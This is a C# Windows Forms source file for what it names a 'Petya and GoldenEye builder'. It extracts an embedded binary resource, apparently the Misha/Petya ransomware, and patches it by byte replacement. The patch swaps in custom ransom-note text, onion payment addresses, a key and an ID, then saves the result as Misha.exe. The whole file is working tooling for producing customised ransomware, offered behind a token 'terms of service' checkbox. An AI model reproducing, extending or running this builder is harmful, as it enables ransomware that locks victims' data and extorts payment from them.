using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Petya_and_GoldenEye_BUILDER.Properties;

// This is ball cancer.
namespace Petya_and_GoldenEye_BUILDER
{
	public partial class Form1 : Form
	{
        private string mihabin;
        private string m_origname;
        private string m_origmain;
        private string m_origcode;
        private string m_origif;
        private string m_origkey;
        private string m_onion1;
        private string m_onion2;
        private string m_id;

        private void Form1_Load(object sender, EventArgs e)
        {
            this.LoadOrig();
            this.InstallFiles();
            this.GetFilePaths();
        }

		public Form1()
		{
			this.InitializeComponent();
		}

		private void exitToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.RemoveFiles();
		}
        
		public void ReplaceMethod()
		{
            if (this.textBox5.Text.Length < this.m_origname.Length)
			{
				string text = this.textBox5.Text;
				for (int i = 0; i < this.m_origname.Length - this.textBox5.Text.Length; i++)
				{
					text += " ";
				}
				this.textBox5.Text = text;
			}

            if (this.textBox7.Text.Length < this.m_origcode.Length)
			{
				string text2 = this.textBox7.Text;
				for (int j = 0; j < this.m_origcode.Length - this.textBox7.Text.Length; j++)
				{
					text2 += " ";
				}
				this.textBox7.Text = text2;
			}

            if (this.textBox8.Text.Length < this.m_origif.Length)
			{
				string text3 = this.textBox8.Text;
				for (int k = 0; k < this.m_origif.Length - this.textBox8.Text.Length; k++)
				{
					text3 += " ";
				}
				this.textBox8.Text = text3;
			}

            if (this.textBox9.Text.Length < this.m_origkey.Length)
			{
				string text4 = this.textBox9.Text;
				for (int l = 0; l < this.m_origkey.Length - this.textBox9.Text.Length; l++)
				{
					text4 += " ";
				}
				this.textBox9.Text = text4;
			}

            if (this.textBox1.Text.Length < this.m_onion1.Length)
			{
				string text5 = this.textBox1.Text;
				for (int m = 0; m < this.m_onion1.Length - this.textBox1.Text.Length; m++)
				{
					text5 += " ";
				}
				this.textBox1.Text = text5;
			}

            if (this.textBox2.Text.Length < this.m_onion2.Length)
			{
				string text6 = this.textBox2.Text;
				for (int n = 0; n < this.m_onion2.Length - this.textBox2.Text.Length; n++)
				{
					text6 += " ";
				}
				this.textBox2.Text = text6;
			}

            if (this.textBox3.Text.Length < this.m_id.Length)
			{
				string text7 = this.textBox3.Text;
				for (int num = 0; num < this.m_id.Length - this.textBox3.Text.Length; num++)
				{
					text7 += " ";
				}
				this.textBox3.Text = text7;
			}

			bool flag8 = this.textBox6.Text.Length != 499;
			if (flag8)
			{
				string text8 = this.textBox6.Text;
				for (int num2 = 0; num2 < 499 - this.textBox6.Text.Length; num2++)
				{
					text8 += " ";
				}
				this.textBox6.Text = text8;
			}

			bool flag9 = this.textBox6.Text.Split(new string[]
			{
				Environment.NewLine
			}, StringSplitOptions.None).Length < 10;
			if (flag9)
			{
				string text9 = this.textBox6.Text;
				for (int num3 = 0; num3 < 10 - this.textBox6.Text.Split(new string[]
				{
					Environment.NewLine
				}, StringSplitOptions.None).Length; num3++)
				{
					text9 += Environment.NewLine;
				}
				this.textBox6.Text = text9;
			}
            
            // The actual edit.
			this.ReplaceTextInFile(this.mihabin, this.m_origname, this.textBox5.Text);
			this.ReplaceTextInFile(this.mihabin, this.m_origmain, this.textBox6.Text);
			this.ReplaceTextInFile(this.mihabin, this.m_origcode, this.textBox7.Text);
			this.ReplaceTextInFile(this.mihabin, this.m_origif,   this.textBox8.Text);
			this.ReplaceTextInFile(this.mihabin, this.m_origkey,  this.textBox9.Text);
			this.ReplaceTextInFile(this.mihabin, this.m_onion1,   this.textBox1.Text);
			this.ReplaceTextInFile(this.mihabin, this.m_onion2,   this.textBox2.Text);
			this.ReplaceTextInFile(this.mihabin, this.m_id, 	  this.textBox3.Text);
            
            // Reset all text.
			this.textBox1.Text = this.m_onion1;
			this.textBox2.Text = this.m_onion2;
			this.textBox3.Text = this.m_id;
			this.textBox5.Text = this.m_origname;
			this.textBox6.Text = this.m_origmain;
			this.textBox7.Text = this.m_origcode;
			this.textBox8.Text = this.m_origif;
			this.textBox9.Text = this.m_origkey;
		}

		private void button1_Click(object sender, EventArgs e)
		{
            if (this.checkBox1.Checked) // I pinky swear.
			{
                if (File.Exists(Path.GetDirectoryName(Application.ExecutablePath) + "\\Misha.exe"))
				{
					File.Delete(Path.GetDirectoryName(Application.ExecutablePath) + "\\Misha.exe");
				}

				this.InstallFiles();
				this.ReplaceMethod();

				File.Move(this.mihabin, Path.GetDirectoryName(Application.ExecutablePath) + "\\Misha.exe");
                this.RemoveFiles();
				
                MessageBox.Show("Done, path: " + Path.GetDirectoryName(Application.ExecutablePath) + "\\Misha.exe", "Successful.", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
			else
			{
				MessageBox.Show("Please accept terms of service", "Aborted!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private void ReplaceTextInFile(string fileName, string oldText, string newText)
		{
			byte[] array = File.ReadAllBytes(fileName);
			byte[] bytes = Encoding.UTF8.GetBytes(oldText);
			byte[] bytes2 = Encoding.UTF8.GetBytes(newText);
			int num = this.IndexOfBytes(array, bytes);
			
            bool flag = num < 0;
			if (!flag)
			{
				byte[] array2 = new byte[array.Length + bytes2.Length - bytes.Length];
				Buffer.BlockCopy(array, 0, array2, 0, num);
				Buffer.BlockCopy(bytes2, 0, array2, num, bytes2.Length);
				Buffer.BlockCopy(array, num + bytes.Length, array2, num + bytes2.Length, array.Length - num - bytes.Length);
				File.WriteAllBytes(fileName, array2);
			}
		}

		private int IndexOfBytes(byte[] searchBuffer, byte[] bytesToFind)
		{
			for (int i = 0; i < searchBuffer.Length - bytesToFind.Length; i++)
			{
				bool flag = true;
				for (int j = 0; j < bytesToFind.Length; j++)
				{
					bool flag2 = searchBuffer[i + j] != bytesToFind[j];
					if (flag2)
					{
						flag = false;
						break;
					}
				}
				bool flag3 = flag;
				if (flag3)
				{
					return i;
				}
			}
			return -1;
		}

		public void InstallFiles()
		{
			File.WriteAllBytes(Path.GetTempPath() + "\\m.bin", Resources.miha);
		}

		public void GetFilePaths()
		{
			this.mihabin = Path.GetTempPath() + "\\m.bin";
		}

		public void LoadOrig()
		{
			this.m_origname = this.textBox5.Text;
			this.m_origmain = this.textBox6.Text;
			this.m_origcode = this.textBox7.Text;
			this.m_origif   = this.textBox8.Text;
			this.m_origkey  = this.textBox9.Text;
			this.m_onion1   = this.textBox1.Text;
			this.m_onion2   = this.textBox2.Text;
			this.m_id       = this.textBox3.Text;
		}

		public void RemoveFiles()
		{
			File.Delete(Path.GetTempPath() + "\\g.bin"); /// ??? leftover old code? 
		}

		private void button3_Click(object sender, EventArgs e)
		{
			this.textBox5.Text = "";
		}

		private void textBox5_TextChanged(object sender, EventArgs e)
		{
			this.label2.Text = this.textBox5.Text.Length + " of";
            if (this.textBox5.Text.Length > 42)
			{
				this.textBox5.Text = this.textBox5.Text.Remove(this.textBox5.Text.Length - 1);
			}
		}

		private void textBox6_TextChanged(object sender, EventArgs e)
		{
			this.label3.Text = this.textBox6.Text.Length + " of";
            if (this.textBox6.Text.Length > 499)
			{
				this.textBox6.Text = this.textBox6.Text.Remove(this.textBox6.Text.Length - 1);
			}
		}

		private void textBox7_TextChanged(object sender, EventArgs e)
		{
			this.label4.Text = this.textBox7.Text.Length + " of";
			bool flag = this.textBox7.Text.Length > 46;
			if (flag)
			{
				this.textBox7.Text = this.textBox7.Text.Remove(this.textBox7.Text.Length - 1);
			}
		}

		private void textBox8_TextChanged(object sender, EventArgs e)
		{
			Label label = this.label5;
			TextBox textBox = this.textBox8;
			label.Text = textBox.Text.Length + " of";
            if (textBox.Text.Length > 57)
			{
				textBox.Text = textBox.Text.Remove(textBox.Text.Length - 1);
			}
		}

		private void textBox9_TextChanged(object sender, EventArgs e)
		{
			Label label = this.label7;
			TextBox textBox = this.textBox9;
			label.Text = textBox.Text.Length + " of";
            if (textBox.Text.Length > 32)
			{
				textBox.Text = textBox.Text.Remove(textBox.Text.Length - 1);
			}
		}

		private void textBox1_TextChanged(object sender, EventArgs e)
		{
			Label label = this.label14;
			TextBox textBox = this.textBox1;
			label.Text = textBox.Text.Length + " of";
            if (textBox.Text.Length > 36)
			{
				textBox.Text = textBox.Text.Remove(textBox.Text.Length - 1);
			}
		}

		private void textBox2_TextChanged(object sender, EventArgs e)
		{
			Label label = this.label6;
			TextBox textBox = this.textBox2;
			label.Text = textBox.Text.Length + " of";
            if (textBox.Text.Length > 38)
			{
				textBox.Text = textBox.Text.Remove(textBox.Text.Length - 1);
			}
		}

		private void textBox3_TextChanged(object sender, EventArgs e)
		{
			Label label = this.label16;
			TextBox textBox = this.textBox3;
			label.Text = textBox.Text.Length + " of";
            if (textBox.Text.Length > 96)
			{
				textBox.Text = textBox.Text.Remove(textBox.Text.Length - 1);
			}
		}
	}
}
